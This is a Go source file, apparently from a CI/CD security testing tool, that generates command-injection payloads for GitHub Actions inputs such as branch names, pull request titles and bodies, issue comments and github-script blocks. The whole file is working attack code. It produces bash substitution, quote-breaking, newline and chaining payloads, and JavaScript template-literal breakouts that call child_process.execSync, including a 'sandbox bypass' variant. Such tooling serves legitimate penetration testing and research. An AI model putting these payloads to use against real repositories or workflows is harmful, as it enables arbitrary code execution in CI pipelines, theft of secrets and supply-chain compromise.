// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

// Package rye provides "Light Rye Bread" - injection payload generation for CI/CD pipelines.
// Different injection contexts have different character constraints and escape requirements.
package rye

// InjectionContext defines constraints for an injection vector.
type InjectionContext struct {
	Name           string   // Human-readable name
	MaxLength      int      // Maximum payload length (0 = unlimited)
	ForbiddenChars []rune   // Characters that will break the injection
	EscapeChar     rune     // Character used for escaping (0 = none)
	QuoteStyle     Quote    // How strings are quoted in this context
	Multiline      bool     // Whether newlines are allowed
	Language       Language // The execution language
}

// Quote style for the injection context.
type Quote int

const (
	QuoteNone Quote = iota
	QuoteSingle
	QuoteDouble
	QuoteBacktick
)

// Language of the injection target.
type Language int

const (
	LangBash Language = iota
	LangJavaScript
	LangPython
	LangYAML
	LangGroovy
)

// Payload represents a generated injection payload.
type Payload struct {
	Raw       string // The raw payload to inject
	Encoded   string // URL/base64 encoded if needed
	Context   string // Which context this is for
	Technique string // Injection technique used
	Notes     string // Usage notes
}

// Common injection contexts for GitHub Actions.
var (
	// BranchName - Git branch names have strict constraints.
	// Forbidden: space, ~, ^, :, ?, *, [, \, .., @{, //
	// Max practical length: ~250 chars
	BranchName = InjectionContext{
		Name:           "git_branch",
		MaxLength:      250,
		ForbiddenChars: []rune{' ', '~', '^', ':', '?', '*', '[', '\\', '@'},
		QuoteStyle:     QuoteNone,
		Multiline:      false,
		Language:       LangBash,
	}

	// PRTitle - Pull request titles, used in ${{ github.event.pull_request.title }}
	// More flexible than branch names but still single line.
	PRTitle = InjectionContext{
		Name:       "pr_title",
		MaxLength:  256,
		QuoteStyle: QuoteNone,
		Multiline:  false,
		Language:   LangBash,
	}

	// PRBody - Pull request body, used in ${{ github.event.pull_request.body }}
	// Most flexible - multiline, long content allowed.
	PRBody = InjectionContext{
		Name:       "pr_body",
		MaxLength:  65536,
		QuoteStyle: QuoteNone,
		Multiline:  true,
		Language:   LangBash,
	}

	// CommitMessage - Git commit messages.
	CommitMessage = InjectionContext{
		Name:       "commit_message",
		MaxLength:  72, // First line convention
		QuoteStyle: QuoteNone,
		Multiline:  true,
		Language:   LangBash,
	}

	// IssueTitle - GitHub issue titles.
	IssueTitle = InjectionContext{
		Name:       "issue_title",
		MaxLength:  256,
		QuoteStyle: QuoteNone,
		Multiline:  false,
		Language:   LangBash,
	}

	// IssueBody - GitHub issue body.
	IssueBody = InjectionContext{
		Name:       "issue_body",
		MaxLength:  65536,
		QuoteStyle: QuoteNone,
		Multiline:  true,
		Language:   LangBash,
	}

	BashUnquoted = InjectionContext{
		Name:       "bash_unquoted",
		MaxLength:  0,
		QuoteStyle: QuoteNone,
		Multiline:  true,
		Language:   LangBash,
	}

	BashSingleQuoted = InjectionContext{
		Name:       "bash_single_quoted",
		MaxLength:  65536,
		QuoteStyle: QuoteSingle,
		Multiline:  true,
		Language:   LangBash,
	}

	BashDoubleQuoted = InjectionContext{
		Name:       "bash_double_quoted",
		MaxLength:  0,
		QuoteStyle: QuoteDouble,
		Multiline:  true,
		Language:   LangBash,
	}

	BashHeredocUnquoted = InjectionContext{
		Name:       "bash_heredoc_unquoted",
		MaxLength:  0,
		QuoteStyle: QuoteNone,
		Multiline:  true,
		Language:   LangBash,
	}

	// GitHubScript - actions/github-script JavaScript context.
	// Injected into template literals or script blocks.
	GitHubScript = InjectionContext{
		Name:       "github_script",
		MaxLength:  0, // No real limit
		QuoteStyle: QuoteBacktick,
		Multiline:  true,
		Language:   LangJavaScript,
	}

	// BashRun - Direct bash run: block in workflow.
	BashRun = InjectionContext{
		Name:       "bash_run",
		MaxLength:  0,
		QuoteStyle: QuoteDouble,
		Multiline:  true,
		Language:   LangBash,
	}
)

// Generator creates payloads for a specific context.
type Generator struct {
	Context InjectionContext
}

// NewGenerator creates a generator for the given context.
func NewGenerator(ctx InjectionContext) *Generator {
	return &Generator{Context: ctx}
}

// Generate creates payloads for the given command.
func (g *Generator) Generate(command string) []Payload {
	var payloads []Payload

	switch g.Context.Language {
	case LangBash:
		payloads = g.generateBashPayloads(command)
	case LangJavaScript:
		payloads = g.generateJSPayloads(command)
	default:
		payloads = g.generateBashPayloads(command)
	}

	return payloads
}

// generateBashPayloads creates bash injection payloads.
func (g *Generator) generateBashPayloads(command string) []Payload {
	var payloads []Payload

	// Command substitution variants
	if g.fits("`" + command + "`") {
		payloads = append(payloads, Payload{
			Raw:       "`" + command + "`",
			Context:   g.Context.Name,
			Technique: "backtick_substitution",
			Notes:     "Classic command substitution",
		})
	}

	if g.fits("$(" + command + ")") {
		payloads = append(payloads, Payload{
			Raw:       "$(" + command + ")",
			Context:   g.Context.Name,
			Technique: "dollar_paren_substitution",
			Notes:     "Modern command substitution",
		})
	}

	// Quote breaking variants
	if g.fits("\";" + command + ";\"") {
		payloads = append(payloads, Payload{
			Raw:       "\";" + command + ";\"",
			Context:   g.Context.Name,
			Technique: "quote_break_semicolon",
			Notes:     "Break out of double quotes with semicolon",
		})
	}

	if g.fits("';" + command + ";'") {
		payloads = append(payloads, Payload{
			Raw:       "';" + command + ";'",
			Context:   g.Context.Name,
			Technique: "single_quote_break",
			Notes:     "Break out of single quotes",
		})
	}

	// Newline injection (if multiline allowed)
	if g.Context.Multiline && g.fits("\n"+command+"\n") {
		payloads = append(payloads, Payload{
			Raw:       "\n" + command + "\n",
			Context:   g.Context.Name,
			Technique: "newline_injection",
			Notes:     "Inject via newline (multiline context)",
		})
	}

	// Pipe injection
	if g.fits("|" + command) {
		payloads = append(payloads, Payload{
			Raw:       "|" + command,
			Context:   g.Context.Name,
			Technique: "pipe_injection",
			Notes:     "Pipe output to command",
		})
	}

	// AND/OR chaining
	if g.fits("&&" + command) {
		payloads = append(payloads, Payload{
			Raw:       "&&" + command,
			Context:   g.Context.Name,
			Technique: "and_chain",
			Notes:     "Chain with AND operator",
		})
	}

	if g.fits("||" + command) {
		payloads = append(payloads, Payload{
			Raw:       "||" + command,
			Context:   g.Context.Name,
			Technique: "or_chain",
			Notes:     "Chain with OR operator",
		})
	}

	return payloads
}

// generateJSPayloads creates JavaScript injection payloads.
func (g *Generator) generateJSPayloads(command string) []Payload {
	var payloads []Payload

	// Template literal escape
	if g.fits("${require('child_process').execSync('" + command + "')}") {
		payloads = append(payloads, Payload{
			Raw:       "${require('child_process').execSync('" + command + "')}",
			Context:   g.Context.Name,
			Technique: "template_literal_exec",
			Notes:     "Template literal with child_process",
		})
	}

	// Backtick escape for template literals
	if g.fits("`);require('child_process').execSync('" + command + "');(`") {
		payloads = append(payloads, Payload{
			Raw:       "`);require('child_process').execSync('" + command + "');(`",
			Context:   g.Context.Name,
			Technique: "backtick_break_exec",
			Notes:     "Break out of template literal",
		})
	}

	// process.mainModule for sandboxed contexts
	if g.fits("${process.mainModule.require('child_process').execSync('" + command + "')}") {
		payloads = append(payloads, Payload{
			Raw:       "${process.mainModule.require('child_process').execSync('" + command + "')}",
			Context:   g.Context.Name,
			Technique: "main_module_exec",
			Notes:     "Via process.mainModule (sandbox bypass)",
		})
	}

	return payloads
}

// fits checks if the payload fits within context constraints.
func (g *Generator) fits(payload string) bool {
	// Check length
	if g.Context.MaxLength > 0 && len(payload) > g.Context.MaxLength {
		return false
	}

	// Check forbidden characters
	for _, c := range payload {
		for _, forbidden := range g.Context.ForbiddenChars {
			if c == forbidden {
				return false
			}
		}
	}

	// Check multiline
	if !g.Context.Multiline {
		for _, c := range payload {
			if c == '\n' || c == '\r' {
				return false
			}
		}
	}

	return true
}

// GetContextByName resolves an injection context name or alias.
func GetContextByName(name string) (InjectionContext, bool) {
	contexts := map[string]InjectionContext{
		"git_branch":            BranchName,
		"pr_title":              PRTitle,
		"pr_body":               PRBody,
		"commit_message":        CommitMessage,
		"issue_title":           IssueTitle,
		"issue_body":            IssueBody,
		"bash_run":              BashRun,
		"bash_unquoted":         BashUnquoted,
		"bash_single_quoted":    BashSingleQuoted,
		"bash_double_quoted":    BashDoubleQuoted,
		"bash_heredoc_unquoted": BashHeredocUnquoted,
		"issue_comment":         BashSingleQuoted,
		"comment_body":          BashSingleQuoted,
		"comment.body":          BashSingleQuoted,
		"issue_comment.body":    BashSingleQuoted,
		"github_script":         GitHubScript,
	}

	ctx, ok := contexts[name]
	return ctx, ok
}
